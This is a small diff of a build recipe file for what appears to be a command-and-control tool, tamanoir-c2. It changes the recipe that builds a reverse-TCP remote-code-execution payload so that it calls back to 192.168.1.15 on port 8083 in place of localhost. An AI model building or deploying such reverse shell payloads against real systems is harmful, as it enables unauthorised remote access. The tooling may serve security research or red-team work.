@@ -42,7 +42,7 @@ c2_run:
 
 #rce build (run on c2 server)
 rce_build_reverse_tcp :
-    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=127.0.0.1 PORT=8082"
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=192.168.1.15 PORT=8083"
 rce_build_hello :
     ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello
 
